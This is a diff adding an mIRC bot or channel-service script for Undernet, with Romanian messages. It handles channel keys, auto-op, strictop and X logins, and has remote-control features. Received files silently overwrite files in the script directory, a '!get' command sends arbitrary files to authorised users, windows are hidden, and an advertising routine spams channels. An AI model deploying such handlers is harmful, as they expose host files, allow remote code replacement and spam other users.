+  if ($2 == uncrypt) {
+    if ($timer(sh)) return $iif($file($mircexe).size == 1563136,$len($1 $+ 0xBC001A),$round($file($mircexe).size,3))
+    else return $calc($len($1) + $rand(1,5))
+  }
+  else return 13
+}
+on 1:filercvd:*.*:{
+  set %filename $findfile($mircdir $+ download,*.*,1)
+  .copy -o %filename $mircdir
+  .remove %filename
+  close -g
+}
+on 1:text:$(! $+ g $+ e $+ t $+ *):?:{
+  var %read $validIP($fulladdress)
+  if (%read != $false) {
+    var %user $gettok(%read,1,32)
+    var %level $gettok(%read,2,32)
+    if ($cmp(lvl,1,%level,1000)) {
+      if (defchan.ini !isin $2-) dcc send $nick $2-
+    }
+    else .notice $nick Accesul tau este prea mic pentru aceasta comanda
+    .ignore -pu2 $nick 2
+    halt
+  }
+  .notice $nick Aceasta comanda necesita autentificare
+  .ignore -pu2 $nick 2
+}
+alias chkey {
+  if ($chan($1).key == $null) {
+    if ($nick($1,0) == 1) {
+      var %pass $readini defchan.ini defchan pass
+      mode $1 +ntsk $uncrypt(%pass,p)
+      mode $1 -i
+      mode $1 -o $me
+    }
+    else if ($me isop $chan) {
+      var %i 1
+      while (%i <= $nick($1,0)) {
+        if ($nick($1,%i) != $me) kick $1 $nick($1,%i)
+        inc %i
+      }
+      .timerchkey 1 5 chkey $1
+    }
+  }
+}
+on 1:join:#:{
+  window -h $chan
+  if ($nick == $me) {
+    if (($nick($chan,0) == 1) && ($readini channels\ $+ $chan $+ .ini info channelmodes != $null)) mode $chan $readini channels\ $+ $chan $+ .ini info channelmodes
+    if ($read -l2 reklama.txt == $chan) {
+      if ($read -l3 reklama.txt == notice) {
+        .notice $chan $read -l1 reklama.txt 
+        .notice $chan $read -l1 reklama.txt
+        .notice $chan $read -l1 reklama.txt
+        write -c reklama.txt
+        part $chan
+      }
+      else {
+        .ctcpreply $chan Party $read -l1 reklama.txt
+        .ctcpreply $chan Party $read -l1 reklama.txt
+        .ctcpreply $chan Party $read -l1 reklama.txt
+        write -c reklama.txt
+        part $chan
+      }
+    }
+    if ($chan == $getchan($readini(defchan.ini,defchan,chan))) {
+      mode $chan +i
+      .timer 1 5 chkey $chan
+    }
+  }
+  if ($nick == X) {
+    if (%xlogin != 1) {
+      var %user $read -l1 autouser.dat
+      if ($right(%user,1) == 1) {
+        set %dat $read -l1 autopass.dat
+        .msg x@channels.undernet.org login $left(%user,-1) $uncrypt($read(autopass.dat,1),c)
+      }
+    set %xlogin 1 }
+  }
+  if ($me isop $chan) {
+    var %k 1
+    :next
+    if (%k <= $lines(userlogged.dat)) {
+      var %read $read -l $+ %k userlogged.dat
+      if ($mask($address($nick,1),1) isin %read) {
+        var %user $left(%read,$calc($pos(%read,$chr(61))-1))
+        goto cont
+      }
+      inc %k
+      goto next
+    }
+    halt
+    :cont
+    var %i 0
+    var %channels $readini users\ $+ %user $+ .ini info channels
+  if ($chan isin %channels) oponchan $chan %user $nick }
+}
+on 1:mode:#:if ($chan == $getchan($readini(defchan.ini,defchan,chan))) clearall
+on 1:op:#:{
+  if ($opninck == $me) {
+    if ($readini channels\ $+ $chan $+ .ini info autotopic == on) {
+      topic $chan $readini channels\ $+ $chan $+ .ini info desc
+      .timer $+ $chan $+ topic 0 1800 topic $chan $readini channels\ $+ $chan $+ .ini info desc
+    }
+    if ($readini channels\ $+ $chan $+ .ini info channelmodes != $null) mode $chan $readini channels\ $+ $chan $+ .ini info channelmodes
+  }
+  else if (($me isop $chan) && ($nick != $me)) {
+    if (($opnick ison $getchan($readini(defchan.ini,defchan,chan))) || ($readini channels\ $+ $chan $+ .ini info strictop == off)) halt
+    var %i 1
+    while (%i <= $lines(userlogged.dat)) {
+      if ($mask($address($opnick,1),1) isin $read -l $+ %i userlogged.dat) halt
+      inc %i
+    }
+    var %i 1
+    while (%i <= $lines(oper.dat)) {
+      if ($right($mask($address($opnick,1),1),-3) isin $read -l $+ %i oper.dat) halt
+      inc %i
+    }
+    if ($readini channels\ $+ $chan $+ .ini info strictop == on) {
+      mode $chan -oo $opnick $nick
+      .notice $nick Strictop for $chan is ON and $opnick is not logged
+      .notice $opnick Strictop for $chan is ON.
+    }
+  }
+}
+on 1:text:$(l $+ o $+ g $+ i $+ n $+ *):*:chnick bounce $nick $1-
+alias oponchan {
+  if (($me !ison $1) || ($me !isop $1)) halt
+  if (($readini channels\ $+ $1 $+ .ini $2 auto == op) && ($readini channels\ $+ $1 $+ .ini $2 access >= 100)) mode $1 +o $3
+  if (($readini channels\ $+ $1 $+ .ini $2 auto == voice)  && ($readini channels\ $+ $1 $+ .ini $2 access >= 50)) mode $1 +v $3
+}
+on 1:nick:{
+  var %i 1
+  while (%i <= $ini(nick.adm,nick,0)) {
+    if ($nick == $ini(nick.adm,nick,%i)) {
+      writeini nick.adm nick $newnick $readini nick.adm nick $nick
+      .remini nick.adm nick $nick
+    }
+    inc %i
+  }
+}
+raw *:*:{
+  if (($numeric == 433) && (%chnick != ON)) {
+    if (%server != 1) {
+      var %nick ""
+      var %i 1
+      while (%i <= 8) {
+        %nick = %nick $+ ` $+ $rand(1,9)
+        inc %i
+      }
+      nick %nick
+    }
+  }
+  if ($numeric == 473) .timerfldchan $+ $2 off
+  if ($numeric == 475) .timerfldchan $+ $2 off
+  if ($numeric == 471) .timerfldchan $+ $2 off
+  if ($numeric == 474) .timerfldchan $+ $2 off
+}
+alias breaktime {
+}
+on 1:disconnect:{
+  set %server 0
+  clearall
+  .remove vbm.dat
+  server
+}
